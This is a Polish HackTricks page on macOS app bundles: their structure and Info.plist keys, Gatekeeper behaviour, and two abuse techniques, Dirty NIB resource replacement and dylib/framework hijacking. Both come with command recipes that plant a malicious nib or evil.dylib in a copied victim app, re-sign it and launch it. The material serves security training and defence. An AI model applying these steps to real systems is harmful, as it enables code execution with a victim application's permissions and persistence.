# Bundles w macOS

{{#include ../../../banners/hacktricks-training.md}}

## Podstawowe informacje

Bundles w macOS służą jako kontenery dla różnych zasobów, w tym aplikacji, bibliotek i innych niezbędnych plików, dzięki czemu w Finderze wyglądają jak pojedyncze obiekty, takie jak znane pliki `*.app`. Najczęściej spotykanym bundlem jest bundle `.app`, choć powszechne są również inne typy, takie jak `.framework`, `.systemextension` i `.kext`.

### Podstawowe elementy bundle

Wewnątrz bundle, szczególnie w katalogu `<application>.app/Contents/`, znajduje się wiele ważnych zasobów:

- **\_CodeSignature**: Ten katalog przechowuje szczegóły podpisu code-signing, niezbędne do weryfikacji integralności aplikacji. Informacje dotyczące code-signing można sprawdzić za pomocą poleceń takich jak:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Zawiera wykonywalny plik binarny aplikacji uruchamiany po interakcji użytkownika.
- **Resources**: Repozytorium komponentów interfejsu użytkownika aplikacji, w tym obrazów, dokumentów i opisów interfejsu (pliki nib/xib).
- **Info.plist**: Pełni funkcję głównego pliku konfiguracyjnego aplikacji, kluczowego dla prawidłowego rozpoznawania aplikacji przez system i interakcji z nią.

#### Ważne klucze w Info.plist

Plik `Info.plist` jest podstawą konfiguracji aplikacji i zawiera takie klucze jak:

- **CFBundleExecutable**: Określa nazwę głównego pliku wykonywalnego znajdującego się w katalogu `Contents/MacOS`.
- **CFBundleIdentifier**: Udostępnia globalny identyfikator aplikacji, szeroko wykorzystywany przez macOS do zarządzania aplikacjami.
- **LSMinimumSystemVersion**: Wskazuje minimalną wersję macOS wymaganą do uruchomienia aplikacji.

### Eksplorowanie Bundles

Aby wyświetlić zawartość bundle, takiego jak `Safari.app`, można użyć następującego polecenia: `bash ls -lR /Applications/Safari.app/Contents`

Eksploracja ta ujawnia katalogi takie jak `_CodeSignature`, `MacOS`, `Resources` oraz pliki takie jak `Info.plist`, z których każdy pełni określoną funkcję — od zabezpieczania aplikacji po definiowanie jej interfejsu użytkownika i parametrów działania.

#### Dodatkowe katalogi Bundles

Oprócz typowych katalogów bundles mogą również zawierać:

- **Frameworks**: Zawiera frameworki dołączone do aplikacji. Frameworki przypominają dylibs, ale zawierają dodatkowe zasoby.
- **PlugIns**: Katalog wtyczek i rozszerzeń zwiększających możliwości aplikacji.
- **XPCServices**: Przechowuje usługi XPC używane przez aplikację do komunikacji out-of-process.

Taka struktura zapewnia hermetyzację wszystkich wymaganych komponentów w bundle, ułatwiając tworzenie modularnego i bezpiecznego środowiska aplikacji.

Więcej szczegółowych informacji na temat kluczy `Info.plist` i ich znaczenia można znaleźć w dokumentacji Apple dla developerów: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Uwagi dotyczące bezpieczeństwa i wektory nadużyć

- **Gatekeeper / App Translocation**: Gdy quarantined bundle jest uruchamiany po raz pierwszy, macOS przeprowadza dokładną weryfikację podpisu i może uruchomić go ze zrandomizowanej ścieżki translocated. Po zaakceptowaniu kolejne uruchomienia wykonują już tylko pobieżne kontrole; pliki zasobów w `Resources/`, `PlugIns/`, nib itd. były historycznie pomijane. Od macOS 13 Ventura przy pierwszym uruchomieniu wymuszana jest dokładna kontrola, a nowe uprawnienie TCC *App Management* ogranicza procesy third-party przed modyfikowaniem innych bundles bez zgody użytkownika, jednak starsze systemy nadal są podatne.
- **Kolizje Bundle Identifier**: Wiele embedded targets (PlugIns, helper tools) używających tego samego `CFBundleIdentifier` może zakłócić walidację podpisu, a czasami umożliwić hijacking/confusion schematu URL. Zawsze wyliczaj sub-bundles i weryfikuj unikalność identyfikatorów.

## Resource Hijacking (Dirty NIB / NIB Injection)

Przed Ventura podmiana zasobów interfejsu użytkownika w podpisanej aplikacji mogła ominąć pobieżne sprawdzanie code signing i doprowadzić do code execution z entitlements aplikacji. Obecne badania (2024) pokazują, że nadal działa to w wersjach starszych niż Ventura oraz w builds bez quarantine:<sup>[1][2]</sup>

1. Skopiuj aplikację docelową do lokalizacji z prawem zapisu, np. `/tmp/Victim.app`.
2. Zastąp `Contents/Resources/MainMenu.nib` (lub dowolny nib zadeklarowany w `NSMainNibFile`) złośliwym plikiem, który tworzy instancję `NSAppleScript`, `NSTask` itd.
3. Uruchom aplikację. Złośliwy nib wykona się w ramach bundle ID i entitlements ofiary (uprawnienia TCC, mikrofon/kamera itd.).
4. Ventura+ ogranicza ten scenariusz, dokładnie weryfikując bundle przy pierwszym uruchomieniu i wymagając uprawnienia *App Management* przy późniejszych modyfikacjach, dlatego utrzymanie persistence jest trudniejsze, jednak ataki podczas pierwszego uruchomienia na starszych wersjach macOS nadal są możliwe.<sup>[1]</sup>

Minimalny przykład malicious nib payload (skompiluj xib do nib za pomocą `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking inside Bundles

Ponieważ wyszukiwanie `@rpath` preferuje zawarte w bundle Frameworks/PlugIns, umieszczenie złośliwej biblioteki w `Contents/Frameworks/` lub `Contents/PlugIns/` może przekierować kolejność ładowania, gdy główny binary jest podpisany bez library validation lub z nieprawidłową kolejnością `LC_RPATH`.

Typowe kroki podczas wykorzystywania niepodpisanego bundle lub bundle podpisanego ad hoc:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Uwagi:
- Hardened runtime bez `com.apple.security.cs.disable-library-validation` blokuje zewnętrzne dylibs; najpierw sprawdź entitlements.
- XPC services w `Contents/XPCServices/` często ładują sąsiednie frameworks — podobnie zmodyfikuj ich binaries w celu uzyskania persistence lub ścieżek privilege escalation.

## Skrócona ściągawka do inspekcji
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Referencje

- [1] [Wprowadzenie process injection do widoku (widoków): wykorzystywanie aplikacji macOS przy użyciu plików nib (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB i bundle resource tampering write-up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)

{{#include ../../../banners/hacktricks-training.md}}
